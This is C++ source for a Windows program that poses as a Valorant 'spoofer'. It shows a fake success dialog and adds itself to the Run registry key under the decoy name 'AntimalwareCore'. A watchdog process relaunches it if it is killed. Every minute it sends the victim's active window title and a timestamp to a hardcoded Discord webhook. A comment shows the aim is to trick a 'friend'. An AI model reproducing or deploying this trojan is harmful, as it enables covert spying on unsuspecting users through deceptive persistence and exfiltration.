#include <windows.h>
#include <gdiplus.h>
#include <wininet.h>
#include <shlobj.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")

using namespace Gdiplus;

std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1497212800219484180/ffoUppkjBoo9PJMX8CgLtFigvLSSMFk8R0MY4hLTd-7aIV1Bzm1xggX3mpRD2c20Eklo";
std::string g_MessageID = "";

// Fake "Success" indicator for the spoofing driver
void ShowSpoofSuccess() {
    MessageBoxA(NULL, "SPOOFER SUCCESS: Driver hooks established. Motherboard serials successfully masked.\n\nPlease keep this process running in the background for persistent bypass.", "VLRNT SB Spoofer", MB_OK | MB_ICONINFORMATION);
}

std::string GetTimestampFull() {
    SYSTEMTIME st; GetLocalTime(&st);
    int hour = st.wHour; std::string ampm = (hour >= 12) ? "PM" : "AM";
    if (hour > 12) hour -= 12; if (hour == 0) hour = 12;
    std::stringstream ss;
    ss << st.wMonth << "/" << st.wDay << "/" << st.wYear << " | " << hour << ":" << std::setfill('0') << std::setw(2) << st.wMinute << " " << ampm;
    return ss.str();
}

std::string GetActiveWindowText() {
    char title[256]; HWND hwnd = GetForegroundWindow(); GetWindowTextA(hwnd, title, 256);
    return (strlen(title) > 0) ? title : "Desktop / Idle";
}

void UpdateSpoofStatus() {
    if (WEBHOOK_URL.find("http") == std::string::npos) return;
    HINTERNET hSession = InternetOpenA("VLRNT_SB_SPOOFER", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;
    std::string method = g_MessageID.empty() ? "POST" : "PATCH";
    std::string url = WEBHOOK_URL + (g_MessageID.empty() ? "?wait=true" : "/messages/" + g_MessageID);
    std::string json = "{\"content\": \"**Spoofing Status:** Active\\n**Attached Process:** `" + GetActiveWindowText() + "`\\n**Last Sync:** `" + GetTimestampFull() + "`\"}";
    HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (hConnect) {
        size_t pos = url.find("discord.com"); std::string path = url.substr(pos + 11);
        HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
        if (hRequest) {
            std::string headers = "Content-Type: application/json\r\n";
            if (HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)json.c_str(), json.length())) {
                if (g_MessageID.empty()) {
                    char buffer[2048]; DWORD bytesRead;
                    if (InternetReadFile(hRequest, buffer, sizeof(buffer)-1, &bytesRead)) {
                        buffer[bytesRead] = '\0'; std::string resp(buffer);
                        size_t idPos = resp.find("\"id\": \"");
                        if (idPos != std::string::npos) g_MessageID = resp.substr(idPos + 7, 19);
                    }
                }
            }
            InternetCloseHandle(hRequest);
        }
        InternetCloseHandle(hConnect);
    }
    InternetCloseHandle(hSession);
}

void InitializeRegistryProtector() {
    char szPath[MAX_PATH]; GetModuleFileNameA(NULL, szPath, MAX_PATH);
    std::string cmd = std::string(szPath) + " --protect-registry " + std::to_string(GetCurrentProcessId());
    STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
    CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    std::string cmdLine = lpCmd;
    if (cmdLine.find("--protect-registry") != std::string::npos) {
        size_t pos = cmdLine.find("--protect-registry ") + 19;
        DWORD parentPid = std::stoul(cmdLine.substr(pos));
        while (true) {
            HANDLE hParent = OpenProcess(SYNCHRONIZE, FALSE, parentPid);
            if (hParent == NULL) {
                char szPath[MAX_PATH]; GetModuleFileNameA(NULL, szPath, MAX_PATH);
                STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
                CreateProcessA(NULL, szPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                return 0;
            }
            CloseHandle(hParent); Sleep(5000); 
        }
    }

    char szPath[MAX_PATH]; GetModuleFileNameA(NULL, szPath, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "AntimalwareCore", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
        RegCloseKey(hKey);
    }

    InitializeRegistryProtector();
    ShowSpoofSuccess(); // Show the "hacker" friend that it "worked"

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    while (true) {
        UpdateSpoofStatus(); Sleep(60000);
    }
    GdiplusShutdown(gdiplusToken);
    return 0;
}
